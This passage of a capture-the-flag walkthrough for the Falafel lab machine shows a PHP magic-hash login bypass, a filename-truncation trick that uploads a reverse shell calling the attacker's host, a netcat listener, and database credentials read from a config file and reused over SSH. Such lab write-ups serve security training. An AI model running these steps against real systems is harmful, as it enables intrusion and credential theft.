+                Database:&nbsp;falafel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Table:&nbsp;users<br>
+                [2&nbsp;entries]<br>
+                +----+--------+----------+---------------------------------------------+<br>
+                |&nbsp;ID&nbsp;|&nbsp;role&nbsp;&nbsp;&nbsp;|&nbsp;username&nbsp;|&nbsp;password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                +----+--------+----------+---------------------------------------------+<br>
+                |&nbsp;1&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;0e462096931906507119562988736854&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;2&nbsp;&nbsp;|&nbsp;normal&nbsp;|&nbsp;chris&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;d4ee02a22fc872e36d9e3751ba72ddc8&nbsp;(juggling)&nbsp;|<br>
+                +----+--------+----------+---------------------------------------------+
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>2d) PHP Type Juggling</strong></h3><br>
+        Chris's password is <code>juggling</code>, which is a reference to PHP type juggling.<br>
+        <br>
+        <strong>What is PHP Type Juggling?</strong><br>
+        PHP has 2 type comparisons:<br>
+        • <code>==</code> - loose<br>
+        • <code>===</code> - stritct<br>
+        <br>
+        Strict comparisons - <code>===</code> - have to be exactly the same for the result to be TRUE.<br>
+        Loose comparisons - <code>==</code> - don't have to be exaclty the same for the result to be TRUE.<br>
+        <br>
+        With loose comparions - <code>==</code> - PHP will make predictions on the types being compared to compensate for human error.<br>
+        <br>
+        <em>For example:</em><br>
+        <span style="text-decoration:underline;">Comparing 2 strings?</span><br>
+        • If PHP decides that both operands look like numbers, despite them actually being strings, PHP will convert them both to integers and perform a comparison<br>
+        <br>
+        <code>"0e12345" == "0e54321"</code> equals <code>TRUE</code><br>
+        <code>"0e12345" <= "1" </code> equals <code>TRUE</code><br>
+        <code>"0e12345" == "0"</code> equals <code>TRUE</code><br>
+        <code>"0xF" == "15"</code> equals <code>TRUE</code><br>
+        <br>
+        <span style="text-decoration:underline;">Comparing an integer and a string?</span><br>
+        • PHP will attempt to convert the string to a number, and then perform a comparison<br>
+        ◇ string starts with 0? php converts the string to the number 0<br>
+        ◇ strings starts with 1? php converst the string to the number 1<br>
+        ◇ string starts with a letter? php convert the string to the number 0t<br>
+        <br>
+        <code>"0000" == int(0)</code> equals <code>TRUE</code><br>
+        <code>"0e12" == int(0)</code> equals <code>TRUE</code><br>
+        <code>"1abc" == int(1)</code> equals <code>TRUE</code><br>
+        <code>"0abc" == int(0)</code> equals <code>TRUE</code><br>
+        <code>"abc" == int(0)</code> equals <code>TRUE</code><br>
+        <br>
+        <span style="text-decoration:underline;">0e</span><br>
+        • <code>e</code> in php means <em>convert the number to an exponent</em> (a power)<br>
+        ◇ e.g. <code>24e12</code> translates to <code>24</code><code><sup>12</sup></code><br>
+        • Because of loose type juggling, this causes a problem<br>
+        <br>
+        <em>For example</em>, you have 2 strings:<br>
+        • <code>"0e462097431906509019562988736854"</code><br>
+        • <code>"0e830400451993494058024219903391"</code><br>
+            &emsp;◇ You compare these 2 strings<br>
+            &emsp;◇ <code>"0e462097431906509019562988736854"</code> == <code>"0e830400451993494058024219903391"</code> equals <code>TRUE</code><br>
+            &emsp;◇ Because you used a loose comparison - <code>==</code> - these 2 strings are equal<br>
+            &emsp; &emsp;▪ This is because:<br>
+            &emsp; &emsp; &emsp;- PHP has decided that these strings actually look like numbers, despite them being strings<br>
+            &emsp; &emsp; &emsp;- Because PHP sees them as numbers, it converts the strings to integers and, because of <code>e</code>. converts the numbers after <code>e</code> into exponents<br>
+            &emsp; &emsp; &emsp; &emsp;→ <code>0e462097431906509019562988736854</code> now becomes <code>0e</code><code><sup>462097431906509019562988736854</sup></code><br>
+            &emsp; &emsp; &emsp; &emsp;→ <code>0e830400451993494058024219903391</code> now becomes <code>0e</code><code><sup>830400451993494058024219903391</sup></code><br>
+            &emsp; &emsp; &emsp;- Now PHP performs the integer comparison<br>
+            &emsp; &emsp; &emsp;- Both integers are read as <code>0e</code><br>
+            &emsp; &emsp; &emsp;- PHP runs <code>0e == 0e</code>, which equals true<br>
+            &emsp; &emsp; &emsp;- These 2 hashes, despite being completely different, have been classed as numerically equal by PHP because of loose type casting<br>
+        <br>
+        <strong>How to exploit 0e?</strong><br>
+        <code>admin</code>'s md5 password hash - <code>0e462096931906507119562988736854</code> - is vulnerable to PHP type juggling because the <code>e</code> converts the rest of the numbers following it into an exponent.<br>
+        <br>
+        <code>0e462096931906507119562988736854</code> becomes <code>0e</code><code><sup>462097431906509019562988736854</sup></code>.<br>
+        <br>
+        This means that when PHP compares the password that we submit at login to the password in the database, it will only compare the <code>0e</code> part of the string, not the entire <code>0e462096931906507119562988736854</code>.<br>
+        <br>
+        Because of this, all we need to do is find a password that, when md5 hashed, starts with <code>0e</code>, and we'll successfully log in. We don't need to find admin's exact password.<br>
+        <br>
+        <a href="https://www.whitehatsec.com/blog/magic-hashes/">https://www.whitehatsec.com/blog/magic-hashes/</a> lists a bunch of different passwords that when hashed start with <code>0e</code>.<br>
+        <br>
+        Because the Falafel database is using md5 hashing, <code>240610708</code> will successfully log us in as <code>admin</code>.<br>
+        <br>
+        <code>admin / 240610708</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Bypass File Upload</strong></h2><br>
+        To upload an image, you serve a file from your attacking machine.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;80</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;80&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And download it via the web form<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Before you start exploiting, prep a php reverse shell and a netcat listener to receive your eventual shell.<br>
+        I'm using pentestmonkey's <code>php-reverse-shell.php</code>.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/usr/share/webshells/php/php-reverse-shell.php&nbsp;monkey.php</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;monkey.php</span><br>
+                [...]<br>
+                <span style="color:#7f0044;font-weight:400">$ip</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.14.7'</span><span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                <span style="color:#7f0044;font-weight:400">$port</span>&nbsp;=&nbsp;9001<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9001</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>3a) Filename Truncation</strong></h3><br>
+        If you upload an image with a super long filename, the filename gets truncated.<br>
+        (there's a filename limit of 255 bytes on Linux, otherwise I would have tried a longer filename)<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-c&nbsp;'print&nbsp;"A"*251'</span><br>
+                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;monkey.php&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.jpg</span><br>
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;80</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;80&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        If you grab the new name, copy it into a text file, and run <code>wc</code> count on it, you'll see that the new name is now 236 characters long (wc is counting a newline character at the end of the file, so subtract 1 from the result).<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;newname.txt</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wc&nbsp;-c&nbsp;newname.txt&nbsp;</span><br>
+                237&nbsp;newname.txt
+            </div>
+        </div><br>
+        <br>
+        We can exploit this truncation.<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>3b) Exploit the Truncation</strong></h3><br>
+        We can exploit the truncation by having our long filename truncate down to a <code>.php</code> extension.<br>
+        <br>
+        To successfully upload a file with a <code>.php</code> extension, create a file name that's 232 characters long + the 4 <code>.php</code> characters + excess characters to hit the truncation limit + <code>.jpg</code> file extension.<br>
+        <br>
+        For example:<br>
+        <code>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.phpccccccccccccccc.jpg</code><br>
+        <br>
+        Becuase the filename ends in <code>.jpg</code>, the php upload form will accept the file, but because the filename is too long it'll get truncated.<br>
+        <br>
+        Because of where we've placed <code>.php</code> in the filename, when truncated to 236 characters, the filename will become:<br>
+        <code>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.php</code><br>
+        <br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-c&nbsp;'print&nbsp;"b"*232&nbsp;+&nbsp;".php"&nbsp;+&nbsp;"c"*15&nbsp;+&nbsp;".jpg"'</span><br>
+                bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.phpccccccccccccccc.jpg<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>upload]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;monkey.php&nbsp;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.phpccccccccccccccc.jpg</span>
+            </div>
+        </div><br>
+        <br>
+        Upload the image:<br>
+        <code>http://10.10.14.7/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.phpccccccccccccccc.jpg<br></code><br>
+        The file successfully uploads!<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        I then navigated to:<br>
+        <code>http://falafel.htb/uploads/1106-1748_b78a6c1e078db3ee/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.php</code><br>
+        <br>
+        to activate my php shell.<br>
+        <br>
+        You should receive a shell as <code>www-data</code> on your listener!<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9001</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.73]&nbsp;44704<br>
+                Linux&nbsp;falafel&nbsp;4.4.0-112-generic&nbsp;<span style="color:#0088ff;font-weight:400">#135-Ubuntu&nbsp;SMP&nbsp;Fri&nbsp;Jan&nbsp;19&nbsp;11:48:36&nbsp;UTC&nbsp;2018&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux</span><br>
+                &nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;up&nbsp;&nbsp;5<span style="color:#ff9d00;font-weight:700">:</span>30,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                yossi&nbsp;&nbsp;&nbsp;&nbsp;tty1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>19&nbsp;&nbsp;&nbsp;&nbsp;5<span style="color:#ff9d00;font-weight:700">:</span>30m&nbsp;&nbsp;0.04s&nbsp;&nbsp;0.04s&nbsp;-bash<br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh:</span>&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cant&nbsp;access&nbsp;tty<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Priv-Esc to moshe</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) connection.php</strong></h2><br>
+        As www-data, check the web root directory to find <code>moshe</code>'s msyql credentials.<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;connection.php<br>
+                &lt;?php<br>
+                &nbsp;&nbsp;&nbsp;define<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'DB_SERVER'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'localhost:3306'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;&nbsp;define<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'DB_USERNAME'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'moshe'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;&nbsp;define<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'DB_PASSWORD'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'falafelIsReallyTasty'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;&nbsp;define<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'DB_DATABASE'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'falafel'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$db</span>&nbsp;=&nbsp;mysqli_connect<span style="color:#ff9d00;font-weight:700">(</span>DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE<span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;Check&nbsp;connection<br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#ffdd00;font-weight:400">mysqli_connect_errno()</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Failed&nbsp;to&nbsp;connect&nbsp;to&nbsp;MySQL:&nbsp;"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;<span style="color:#ffdd00;font-weight:400">mysqli_connect_error()</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span><br>
+                ?&gt;
+            </div>
+        </div><br>
+        <br>
+        <code>falafelIsReallyTasty</code> also happens to be <code>moshe</code>'s system password.<br>
+        SSH into Falafel as <code>moshe</code> and grab <code>user.txt</code>.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;moshe@falafel.htb</span><br>
+                [...]<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;16.04.3&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.4.0-112-generic&nbsp;x86_64<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                &nbsp;*&nbsp;Documentation<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>help.ubuntu.com<br>
+                &nbsp;*&nbsp;Management<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>landscape.canonical.com<br>
+                &nbsp;*&nbsp;Support<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>ubuntu.com<span style="color:#ff9d00;font-weight:700">/</span>advantage<br>
+                <br>
+                0&nbsp;packages&nbsp;can&nbsp;be&nbsp;updated.<br>
+                0&nbsp;updates&nbsp;are&nbsp;security&nbsp;updates.<br>
+                <br>
+                Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Mon&nbsp;Feb&nbsp;&nbsp;5&nbsp;23<span style="color:#ff9d00;font-weight:700">:</span>35<span style="color:#ff9d00;font-weight:700">:</span>10&nbsp;2018&nbsp;from&nbsp;10.10.14.2<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                moshe<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+                c866575ed59...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to yossi</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) /dev/fb0</strong></h2><br>
+        Elevate to a bash shell (because it's prettier) and check what groups <code>moshe</code> is part of.<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span>&nbsp;<br>
+                moshe@falafel<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/groups</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span><br>
+                moshe&nbsp;adm&nbsp;mail&nbsp;news&nbsp;voice&nbsp;floppy&nbsp;audio&nbsp;video&nbsp;games
+            </div>
+        </div><br>
+        <br>
+        <code>moshe</code> is part of some non-standard groups.<br>
+        Find files owned by the <code>video</code> group.<br>
+            <div class="codebox">
+                moshe@falafel<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/groups</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-group&nbsp;video&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>fb0<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>dri<span style="color:#ff9d00;font-weight:700">/</span>card0<br>
